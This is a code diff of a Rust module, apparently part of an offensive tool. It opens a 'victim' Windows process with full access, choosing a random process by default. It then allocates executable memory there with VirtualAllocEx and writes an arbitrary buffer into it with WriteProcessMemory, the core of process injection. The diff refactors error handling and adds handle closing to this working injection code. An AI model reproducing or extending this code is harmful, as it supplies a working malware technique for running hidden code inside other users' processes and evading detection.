@@ -1,27 +1,27 @@
 use core::ffi::c_void;
-use std::ptr::null_mut;
 
-use windows::{
-    Win32::{
-        Foundation::HANDLE,
-        System::{
-            Diagnostics::Debug::WriteProcessMemory,
-            Memory::{
-                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
-                VIRTUAL_ALLOCATION_TYPE, VirtualAllocEx,
-            },
-            Threading::{OpenProcess, PROCESS_ALL_ACCESS},
+use windows::Win32::{
+    Foundation::{CloseHandle, HANDLE},
+    System::{
+        Diagnostics::Debug::WriteProcessMemory,
+        Memory::{
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
+            VIRTUAL_ALLOCATION_TYPE, VirtualAllocEx,
         },
+        Threading::{OpenProcess, PROCESS_ALL_ACCESS},
     },
-    core::Error,
 };
 
-use crate::proc::ProcessSnapshot;
+use crate::{err::AllocErr, proc::ProcessSnapshot};
 
 #[derive(Debug)]
 pub struct ProcessMemoryInfo {
     pub victim_process_id: u32,
     pub block_ptr: *mut c_void,
+}
+
+pub struct ProcessClassification {
+    pub process_id: u32,
 }
 
 pub struct AllocationWrapper {}
@@ -45,8 +45,19 @@ impl AllocationWrapper {
         Self {}
     }
 
-    fn resolve_process_handle(&self, id: u32) -> Option<HANDLE> {
-        unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, id).ok() }
+    fn close_handle(&mut self, handle: &HANDLE) {
+        unsafe {
+            let _ = CloseHandle(*handle);
+        }
+    }
+
+    fn resolve_process_handle(&self, id: u32) -> Result<HANDLE, AllocErr> {
+        unsafe {
+            match OpenProcess(PROCESS_ALL_ACCESS, false, id) {
+                Ok(k) => Ok(k),
+                Err(_) => Err(AllocErr::ProcessReolveError),
+            }
+        }
     }
 
     /// Allocate a block of size `usize`. If you instead would like to commit a block
@@ -60,16 +71,19 @@ impl AllocationWrapper {
     pub fn israel_alloc(
         &mut self,
         size: usize,
-        proc_inf: Option<ProcessMemoryInfo>,
+        proc_inf: Option<ProcessClassification>,
     ) -> Option<ProcessMemoryInfo> {
         let mut rproc = ProcessSnapshot::new();
 
         let p_id = match proc_inf {
-            Some(id_val) => id_val.victim_process_id,
+            Some(id_val) => id_val.process_id,
             None => rproc.find_random_process_id(),
         };
 
-        let raw_handle_ptr = self.resolve_process_handle(p_id)?;
+        let raw_handle_ptr = match self.resolve_process_handle(p_id) {
+            Ok(handle) => handle,
+            Err(err) => panic!("{}", err),
+        };
 
         let ptr: *mut c_void = unsafe {
             VirtualAllocEx(
@@ -80,6 +94,8 @@ impl AllocationWrapper {
                 PAGE_PROTECTION_FLAGS(PAGE_EXECUTE_READWRITE.0),
             )
         };
+
+        self.close_handle(&raw_handle_ptr);
 
         Some(ProcessMemoryInfo {
             victim_process_id: p_id,
@@ -97,17 +113,24 @@ impl AllocationWrapper {
         atk: &ProcessMemoryInfo,
         buff: *const c_void,
         size: usize,
-    ) -> Result<(), Error> {
+    ) -> Result<(), AllocErr> {
         let block_start = atk.block_ptr;
         let p_id = atk.victim_process_id;
 
-        let ptr: HANDLE;
-
         match self.resolve_process_handle(p_id) {
-            Some(k) => ptr = k,
-            None => ptr = HANDLE(null_mut()), /* Correct standard for handling invalid HANDLE objects. */
+            Ok(k) => unsafe {
+                match WriteProcessMemory(k, block_start, buff, size, None) {
+                    Ok(_) => {
+                        self.close_handle(&k);
+                        Ok(())
+                    }
+                    Err(_) => {
+                        self.close_handle(&k);
+                        Err(AllocErr::BlockWriteFailure)
+                    }
+                }
+            },
+            Err(err) => Err(err),
         }
-
-        unsafe { WriteProcessMemory(ptr, block_start, buff, size, None) }
     }
 }
